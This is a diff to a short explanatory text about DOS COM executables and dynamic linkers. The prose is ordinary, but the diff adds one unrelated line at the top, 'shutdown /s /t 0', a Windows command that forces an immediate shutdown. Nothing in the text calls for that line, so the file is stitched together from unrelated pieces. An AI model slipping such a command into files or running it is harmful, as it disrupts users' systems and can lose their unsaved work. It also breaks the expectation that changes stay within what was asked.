@@ -1,3 +1,5 @@
+shutdown /s /t 0
+
 In DOS environments, a COM file is an executable command file with a.COM filename extension. COM files can be directly executed and are usually slightly smaller than equivalent EXE files. However, COM files cannot exceed 64K, so large programs are usually stored in EXE files.
 
 In computing, a dynamic linker is the part of an operating system that loads and links the shared libraries needed by an executable when it is executed (at "run time"), by copying the content of libraries from persistent storage to RAM, and filling jump tables and relocating pointers. The specific operating system and executable format determine how the dynamic linker functions and how it is implemented.
